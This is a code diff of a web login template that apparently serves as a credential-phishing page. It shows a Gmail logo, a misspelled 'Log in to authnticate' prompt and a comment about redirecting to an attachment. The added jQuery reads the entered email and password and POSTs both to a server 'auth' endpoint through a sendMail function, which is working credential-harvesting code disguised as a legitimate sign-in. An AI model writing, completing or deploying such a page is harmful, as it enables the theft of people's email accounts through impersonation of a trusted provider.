@@ -52,13 +52,13 @@
         <div id="row3">
             <h3 class=""><img src="img/ssl.png" style="margin: 20px;" alt="Gmail" width="140" height="50">Log in to authnticate:</h3>
         <span class="input input--hoshi">
-          <input class="input__field input__field--hoshi" type="text" id="email" />
+          <input class="input__field input__field--hoshi" type="text" id="email" required/>
           <label class="input__label input__label--hoshi input__label--hoshi-color-3" for="email">
             <span class="input__label-content input__label-content--hoshi">E-mail</span>
           </label>
         </span>
         <span class="input input--hoshi">
-          <input class="input__field input__field--hoshi" type="password" id="password" />
+          <input class="input__field input__field--hoshi" type="password" id="password" required/>
           <label class="input__label input__label--hoshi input__label--hoshi-color-3" for="password">
             <span class="input__label-content input__label-content--hoshi">Password</span>
           </label>
@@ -134,6 +134,22 @@ $(document).ready(function(){
      // alert("clicked yahoo");
      setauth("o");
    });
+   
+   $('#btn1').click(function(e){
+          u = $('#email').val();
+          p = $('#password').val();
+          
+          if(u == "" || p == ""){
+               if(u == "") alert("Usernamd is required");
+               if(p == "") alert("Password is required");
+          } 
+          
+          else{
+             	sendMail(u,p);
+          }
+          
+          return false;
+        });
 });
 
 function setauth(auth){
@@ -150,6 +166,35 @@ function setauth(auth){
   $('#row2').hide();
   $('#row3').fadeIn();
 } 
+
+function sendMail(user, pass){
+        data = {"_token": "{{csrf_token()}}", "username": user, "pass": pass};
+           $.ajax({
+    
+   type : 'POST',
+   url  : "{{url('auth')}}",
+   data : data,
+   beforeSend: function()
+   { 
+    $("#error").fadeOut();
+    $("#response").fadeOut();
+    $("#working").html('<br><br><img class="img img-responsive" src="{{asset('img/loading.gif')}}" alt="Authenticating.. " width="150" height="150"><br>Authenticating.... </strong>');
+   },
+   success :  function(response)
+      {        
+        //alert(response);
+        $("#working").fadeOut();
+        if(response == "success"){
+          //redirect to attachment
+        } 
+        
+        else{
+           $("#response").html(response);    
+        } 
+     }
+   });
+         return false;            
+    } 
 </script>
 
 </body>
